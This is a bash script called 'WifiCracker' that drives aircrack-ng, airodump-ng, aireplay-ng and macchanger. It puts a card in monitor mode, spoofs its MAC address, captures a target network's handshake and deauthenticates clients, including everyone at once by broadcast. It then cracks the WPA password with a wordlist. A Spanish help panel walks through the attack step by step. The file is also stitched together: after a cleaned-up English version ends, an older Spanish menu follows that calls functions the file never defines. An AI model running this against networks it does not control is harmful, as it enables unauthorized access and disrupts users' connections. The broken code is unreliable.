#!/bin/bash
set -u

# Shortened and cleaned-up version of the original WifiCracker script.
# Keeps the same core commands (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, macchanger).

MON_IFACE=mon0
MODE=1

require_root(){
  if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root."; exit 1
  fi
}

start_monitor(){
  echo "Available interfaces:"; ifconfig
  read -rp "Enter wireless interface (e.g. wlan0, wlp2s0): " iface
  airmon-ng start "$iface"
  sleep 1
  ifconfig "$MON_IFACE" down || true
  macchanger -a "$MON_IFACE" || true
  ifconfig "$MON_IFACE" up
  MODE=2
  echo "Monitor mode enabled on $MON_IFACE"
}

stop_monitor(){
  airmon-ng stop "$MON_IFACE" || echo "$MON_IFACE not found or already stopped"
  MODE=1
}

show_interfaces(){
  ifconfig
}

scan_and_capture(){
  if [ "$MODE" -ne 2 ]; then echo "Start monitor mode first."; return; fi
  echo "Running airodump-ng (press Ctrl+C when you see targets)..."
  airodump-ng "$MON_IFACE"
  read -rp "Target ESSID: " essid
  read -rp "Channel (CH): " ch
  read -rp "Folder name (created on Desktop): " folder
  read -rp "Base filename: " fname
  read -rp "Local username: " user
  mkdir -p "/home/$user/Escritorio/$folder"
  cd "/home/$user/Escritorio/$folder" || return
  echo "Capturing traffic for $essid on channel $ch (output: ${fname}-01.cap)..."
  airodump-ng -c "$ch" -w "$fname" --essid "$essid" "$MON_IFACE"
}

deauth(){
  read -rp "Target ESSID: " essid
  read -rp "Station MAC (or FF:FF:FF:FF:FF:FF for broadcast): " station
  echo "Sending deauth packets to $station (press Ctrl+C to stop)..."
  aireplay-ng -0 0 -e "$essid" -c "$station" --ignore-negative-one "$MON_IFACE"
}

fake_auth(){
  read -rp "Fake client MAC: " fake
  read -rp "Target ESSID: " essid
  aireplay-ng -1 0 -e "$essid" -h "$fake" --ignore-negative-one "$MON_IFACE"
}

crack(){
  read -rp "Dictionary filename (on Desktop): " dict
  read -rp "Folder where capture is stored (on Desktop): " folder
  read -rp "Capture filename (with extension .cap): " capfile
  read -rp "Local username: " user
  aircrack-ng -w "/home/$user/Escritorio/$dict" "/home/$user/Escritorio/$folder/$capfile"
}

install_deps(){
  read -rp "Install aircrack-ng and macchanger via apt-get? (y/N): " ans
  case "$ans" in
    [Yy]*) apt-get update; apt-get install -y aircrack-ng macchanger ;;
    *) echo "Skipped installation." ;;
  esac
}

show_menu(){
  cat <<-EOF
  1) Start monitor mode
  2) Stop monitor mode
  3) Show interfaces
  4) Scan & capture (airodump-ng)
  5) Deauth (aireplay-ng)
  6) Fake auth (aireplay-ng)
  7) Crack (aircrack-ng)
  8) Install dependencies
  9) Quit
EOF
}

require_root
while true; do
  show_menu
  read -rp "Choice: " opt
  case "$opt" in
    1) start_monitor ;; 2) stop_monitor ;; 3) show_interfaces ;; 4) scan_and_capture ;;
    5) deauth ;; 6) fake_auth ;; 7) crack ;; 8) install_deps ;; 9) break ;;
    *) echo "Invalid option." ;;
  esac
done

echo "Exiting."

versionSystem(){

  echo " "
  echo "WifiCracker (v0.1.2) - Copyright 2016 © Marcelo Raúl Vázquez Pereyra"
  echo " "
  sleep 5

}

panelHelp(){

  echo " "
  echo "************************************************************************************"
  echo "El primer paso es iniciar el modo monitor a través de la opción 1. Una vez iniciado
el modo monitor... eres capaz de escuchar y capturar cualquier paquete que viaje por el aire.

Puedes comprobar a través de la opción 2 si has iniciado correctamente la interfaz monitor.
Posteriormente, analizarás redes WiFis disponibles en tu entorno mediante la opción 4. Te
saldrán tanto clientes autenticados a una red como no asociados a ninguna. Cada cliente
está situado en 'STATION' y poseen una dirección MAC. Estos verás que están conectados a
una dirección MAC, correspondiente a la del routter (BSSID). Puedes ver de qué WiFi se trata
viendo su 'ESSID' correspondiente.

El programa te permitirá filtrar la red WiFi que deseas aislando el resto pasándole como
parámetro el nombre de la misma. Si salen varias veces la misma red, se tratan de
repartidores de señal. Una vez hecho esto una nueva carpeta será creada en el Escritorio
con el nombre que desees, esta contendrá varios ficheros... entre los cuales viajará
información encriptada, incluida la contraseña del routter. El que nos interesa es el de
extensión '.cap'.

Una vez creadas las carpetas y ficheros, procedes a de-autenticar a los usuarios de la red.
En este caso te centrarás en un único usuario conectado a la red, para ello lo que harás
será escoger la dirección MAC del mismo y pasársela como parámetro cuando te sea pedida.
También se te permite la posibildad de realizar una de-autenticación global, de forma que
echarías a todos los usuarios de la red exceptuándote a ti mismo en caso de que estés
conectado a la misma, esto lo haces pasándole como dirección MAC -> FF:FF:FF:FF:FF:FF

Una vez comience el 'ataque' y el usuario sea echado de la red, tendrás que parar el proceso
de de-autenticación y esperar a que se reconecte. Cuando se reconecta se genera lo que se
conoce como un 'Handshake', y es cuando capturamos la contraseña.

Por tanto, una vez hecho todo este proceso, mediante la opción 7 especificamos 2 rutas,
por un lado la del Diccionario (que deberá ser puesto en el Escritorio) y por otro la del
fichero '.cap' que se nos generó en la opción 4. El programa comenzará a trabajar hasta
averiguar la contraseña, la cual será mostrada en formato legible.
********************************************************************************************"
  echo " "
  echo -n "Pulse cualquier tecla y Enter para volver al menú principal: "
  read
}

while true
  do

    clear
    echo " "
    echo "    *** Wifi Cracker ***"
    echo " "
    echo "1. Iniciar el modo monitor "
    echo "2. Mostrar interfaces"
    echo "3. Dar de baja el modo monitor"
    echo "4. Escanear redes wifis"
    echo "5. Deautenticación a dirección MAC"
    echo "6. Falsa autenticación de cliente"
    echo "7. Obtener contraseña Wifi"
    echo "8. Reiniciar programa"
    echo "9. Instalar programas necesarios"
    echo " "
    echo "*************************************************"
    echo "[[-h | --help ] [-a | --author] [-v | --version]]"
    echo "*************************************************"
    echo "0. Salir "
    echo "-------------------------------------------------"
    echo " "
    echo -n "Introduzca una opcion: "
    read opcionMenu

    case $opcionMenu in

      1 ) monitorMode ;;

      2 ) interfacesMode ;;

      3 ) monitorDown ;;

      4 ) wifiScanner ;;

      5 ) macAttack ;;

      6 ) fakeAuth ;;

      7 ) wifiPassword ;;

      8 ) resetProgram ;;

      9 ) necessaryPrograms ;;

      -h | --help ) panelHelp ;;

      -a | --author ) autorInfo ;;

      -v | --version ) versionSystem ;;

      0 ) echo " "
          exit
          ;;

      * ) echo " "
          echo "Esta opción no existe, vuelva a intentarlo"
          echo " "
          sleep 2
          ;;
    esac
done
